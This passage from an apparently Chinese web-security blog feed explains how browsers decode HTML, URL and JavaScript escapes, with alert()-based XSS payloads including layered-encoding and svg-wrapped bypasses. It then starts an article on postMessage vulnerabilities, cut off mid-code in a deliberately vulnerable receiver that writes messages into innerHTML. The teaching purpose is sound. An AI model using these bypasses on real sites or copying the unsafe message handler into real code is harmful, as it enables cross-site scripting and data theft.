title="payload7"></a>payload7</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#48;&amp;#41;&amp;#59;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload无法执行，因为JavaScript解析器工作时，HTML解析器的工作已经结束了。</p><p><code>script</code>属于原始文本元素(Raw text elements)，<strong>只可以容纳文本</strong>，注意<strong>没有字符引用</strong>，于是直接由JS处理，JS也认不出来，执行失败。</p><p>注意：原始文本元素(Raw text elements)有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>。</p><h3 id="payload8"><a href="#payload8" class="headerlink" title="payload8"></a>payload8</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0030)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该payload看似能执行，但实际并不会，这是因为<code>\u0030</code>在JavaScript解码时会被解码为字符串”0”而不是数字0。</p><p>注意：JavaScript解码的结果都是字符串，而字符串自然是需要引号的，所以JavaScript执行失败。</p><h3 id="payload9"><a href="#payload9" class="headerlink" title="payload9"></a>payload9</h3><p>先对<code>alert(0)</code>进行JavaScript编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074('\u0030')"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后对编码后的结果进行URL编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34%28%27%5c%75%30%30%33%30%27%29"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后，对所有内容进行HTML编码，得到最终payload，是能成功执行的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#37;&amp;#50;&amp;#56;&amp;#37;&amp;#50;&amp;#55;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#51;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#50;&amp;#55;&amp;#37;&amp;#50;&amp;#57;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li><code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>数据只能有文本，不会有HTML解码和URL解码操作；</li><li><code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>里会有HTML解码操作，但不会有子元素；</li><li>其他元素数据（如<code>div</code>）和元素属性数据（如<code>href</code>）中会有HTML解码操作；</li><li>部分属性（如<code>href</code>）会有URL解码操作，但URL中的协议需为ASCII；</li><li>JavaScript会对字符串和标识符Unicode解码；</li></ol><h2 id="0x05-script标签"><a href="#0x05-script标签" class="headerlink" title="0x05 script标签"></a>0x05 script标签</h2><p>script标签用来指定网页中所执行的JavaScript，其中既可以直接包含JS代码，也可以指向一个JS外链。</p><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>script标签按照它所出现的顺序依次执行。</p><p>比如这样就能弹框显示6：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x = <span class="number">6</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(x);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但反过来就执行就找不到x变量了，报错<code>Uncaught ReferenceError: x is not defined</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(x);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> x = <span class="number">6</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同理，使用script引入外链是一样的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://a.com/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://mi1k7ea.com/m.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>页面元素在渲染之前，首先会等待所有脚本都加载完毕，所以如果存在某些较慢的脚本，网页加载速度将会被严重拖累。但这个规则不适用于网页加载完成之后，通过document.appendChild之类的方法，在DOM树下添加script标签，这些标签会根据浏览器请求完成的先后来执行脚本，不再保证加载顺序。</p><h3 id="执行域"><a href="#执行域" class="headerlink" title="执行域"></a>执行域</h3><p>script标签只能访问它之前的HTML元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">// document.head is available</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// document.body is not!</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">// document.head is available</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// document.body is available</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>通过DOM动态添加到页面上的script标签会被浏览器执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myScript = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">myScript.textContent = <span class="string">"alert(0)"</span>;</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(myScript);</span><br></pre></td></tr></table></figure><p>但是使用innerHTML动态添加到页面上的script标签并不会被浏览器执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.head.innerHTML += "<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(0)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>";</span><br></pre></td></tr></table></figure><h2 id="0x06-SVG黑魔法"><a href="#0x06-SVG黑魔法" class="headerlink" title="0x06 SVG黑魔法"></a>0x06 SVG黑魔法</h2><p>看如下两个payload。</p><p>payload1，HTML编码<code>(</code>，是无法正常执行的，因为script标签内会进行JS解码、此时HTML解析器已完成工作了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>payload2，在前面加个svg标签，此时能成功触发弹框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可执行的原因在于，svg属于外部元素，svg标签遵循XML和SVG的定义。</p><p>我们知道，在XML中，<code>&amp;#40;</code>会被解析成<code>（</code>。在XML中实体会自动转义，除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>aaaaaaa&amp;#40;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然，<a href="https://www.w3.org/TR/SVG/script.html#ScriptElement" target="_blank" rel="noopener">SVG标准中</a>也定义了script标签的存在：</p><p><img src="/2020/04/06/从浏览器解析原理看XSS/1.png" alt=""></p><p>所以，这个XSS之所以能够执行是因为遵循了svg及xml的标准。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://xz.aliyun.com/t/5863" target="_blank" rel="noopener">浏览器解码看XSS</a></p><p><a href="http://whip1ash.cn/2018/07/01/HTML-Javscript-self-decode/" target="_blank" rel="noopener">XSS基础——浏览器自解码机制</a></p><p><a href="https://xz.aliyun.com/t/5950" target="_blank" rel="noopener">从 XSS Payload 学习浏览器解码</a></p><p><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">SVG XSS的一个黑魔法</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://www.mi1k7ea.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>postMessage跨域漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2020/04/06/%E6%B5%85%E6%9E%90postMessage%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2020/04/06/浅析postMessage安全/</id>
    <published>2020-04-06T04:46:28.000Z</published>
    <updated>2020-04-06T14:14:08.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="何为postMessage"><a href="#何为postMessage" class="headerlink" title="何为postMessage"></a>何为postMessage</h3><p>一般的，由于同源策略（SOP）的限制，不同域之间是无法进行通信的。</p><p>我们知道常见的跨域技术有JSONP、CORS等。除此之外，在HTML5中新增了postMessage方法来实现跨域通信，postMessage可以实现跨文档消息传输（Cross Document Messaging），Internet Explorer 8, Firefox 3, Opera 9, Chrome 3和 Safari 4都支持postMessage。</p><p>postMessage可以通过绑定window的message事件来监听发送跨文档消息传输内容。</p><p>API参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><h4 id="函数基本语法"><a href="#函数基本语法" class="headerlink" title="函数基本语法"></a>函数基本语法</h4><p>postMessage()函数基本语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.postMessage(message, targetOrigin, [transfer]);</span><br></pre></td></tr></table></figure><ul><li>otherWindow：其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames。</li><li>message：将要发送到其他 window的数据。它将会被结构化克隆算法序列化。这意味着你可以不受什么限制的将数据对象安全的传送给目标窗口而无需自己序列化。</li><li>targetOrigin：通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串<code>*</code>（表示无限制）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。这个机制用来控制消息可以发送到哪些窗口；例如，当用postMessage传送密码时，这个参数就显得尤为重要，必须保证它的值与这条包含密码的信息的预期接受者的origin属性完全一致，来防止密码被恶意的第三方截获。如果你明确的知道消息应该发送到哪个窗口，那么请始终提供一个有确切值的targetOrigin，而不是<code>*</code>。不提供确切的目标将导致数据泄露到任何对数据感兴趣的恶意站点。</li><li>transfer（可选）：是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。</li></ul><h4 id="子窗口引用获取"><a href="#子窗口引用获取" class="headerlink" title="子窗口引用获取"></a>子窗口引用获取</h4><p>postMessage在通信之前，父窗口需要先获得子窗口的引用，存在两个情况：</p><ul><li>获取iframe的引用；</li><li>获取window.open的引用；</li></ul><p>后面的示例以iframe引用为例。</p><h4 id="父窗口-gt-子窗口"><a href="#父窗口-gt-子窗口" class="headerlink" title="父窗口 -&gt; 子窗口"></a>父窗口 -&gt; 子窗口</h4><p>父窗口 father.com 向子窗口 son.com 发消息，调用postMessage方法即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> receiver = <span class="built_in">window</span>.open(<span class="string">'http://son.com'</span>, <span class="string">'title'</span>);</span><br><span class="line">receiver.postMessage(<span class="string">'HelloWorld!'</span>, <span class="string">'http://son.com'</span>);</span><br></pre></td></tr></table></figure><p>postMessage()函数的第一个参数是消息内容，第二个参数是接收消息的窗口的源，也可以设置为<code>*</code>，表示不限定域名，向所有窗口发送消息。</p><h4 id="子窗口-gt-父窗口"><a href="#子窗口-gt-父窗口" class="headerlink" title="子窗口 -&gt; 父窗口"></a>子窗口 -&gt; 父窗口</h4><p>子窗口发送消息的方法类似：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.opener.post(<span class="string">'Nice to meet you'</span>, <span class="string">'http://father.com'</span>);</span><br></pre></td></tr></table></figure><h4 id="监听消息"><a href="#监听消息" class="headerlink" title="监听消息"></a>监听消息</h4><p>父窗口和子窗口都可以通过message事件来监听对方的消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//event.data就是接收到的数据</span></span><br><span class="line">    <span class="built_in">console</span>.log(event.data);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>message事件的事件对象，提供三个对象：</p><h5 id="event-source"><a href="#event-source" class="headerlink" title="event.source"></a>event.source</h5><p>event.source表示发送对象的窗口。</p><p>子窗口可以通过event.source属性引用父窗口，然后发送消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, receiveMessage);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.source.postMessage(<span class="string">'Nice to see you!'</span>, <span class="string">'*'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="event-origin"><a href="#event-origin" class="headerlink" title="event.origin"></a>event.origin</h5><p>event.origin表示消息发往的地址。</p><p>可以使用event.origin来过滤不是发送给本窗口的消息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, receiveMessage);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.origin !== <span class="string">'http://father.com'</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (event.data == <span class="string">'HelloWorld!'</span>) &#123;</span><br><span class="line">        event.source.postMessage(<span class="string">'Hello'</span>, event.origin);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(event.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="event-data"><a href="#event-data" class="headerlink" title="event.data"></a>event.data</h5><p>event.data表示消息内容。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>father.html，父iframe，运行在127.0.0.1这个域iframe引入位于192.168.203.1的子窗口：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Father<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Father's Page<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"send"</span>&gt;</span>Send Message<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span> <span class="attr">id</span>=<span class="string">"receiver"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> receiver = <span class="built_in">document</span>.getElementById(<span class="string">'receiver'</span>).contentWindow;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'send'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript">btn.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span><span class="params">(e)</span></span>&#123;</span></span><br><span class="line"><span class="undefined">e.preventDefault();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> val = <span class="built_in">document</span>.getElementById(<span class="string">'text'</span>).value;</span></span><br><span class="line"><span class="actionscript">receiver.postMessage(val, <span class="string">"http://192.168.203.1"</span>);</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>child.html，子iframe，运行在192.168.203.1这个域，监听回复位于127.0.0.1的父窗口：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Child<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">Hello World!</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> messageEle = <span class="built_in">document</span>.getElementById(<span class="string">'message'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (e.origin !== <span class="string">"http://127.0.0.1"</span>) &#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="actionscript">messageEle.innerHTML = <span class="string">"Received Message: "</span> + e.data;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终效果如下：</p><p><img src="/2020/04/06/浅析postMessage安全/1.png" alt=""></p><h2 id="0x02-postMessage跨域漏洞"><a href="#0x02-postMessage跨域漏洞" class="headerlink" title="0x02 postMessage跨域漏洞"></a>0x02 postMessage跨域漏洞</h2><p>postMessage跨域漏洞主要包括两大类：</p><ul><li>伪造数据发送端，造成XSS等问题；</li><li>伪造数据接收端，窃取用户数据，类似于JSONP劫持漏洞；</li></ul><h3 id="伪造数据发送端"><a href="#伪造数据发送端" class="headerlink" title="伪造数据发送端"></a>伪造数据发送端</h3><p>当接收端接收任意窗口的消息，未对父窗口来源进行限制并将消息输出时，此时攻击者可以伪造数据发送端来进行各种危险操作。比如订单支付时，父窗口传输订单详情，子窗口处理支付流程，攻击者可以伪造父窗口来篡改订单详情，让用户支付了本不属于自己的订单。</p><p>接下来以伪造父窗口，导致XSS为例。</p><h4 id="iframe引用"><a href="#iframe引用" class="headerlink" title="iframe引用"></a>iframe引用</h4><p>child.html，接受任意窗口的消息，并对消息进行输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web page from child.com<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">// event参数中有data属性，就是父窗口发送过来的数据</span></span></span><br><span class="line"><span class="javascript"><span 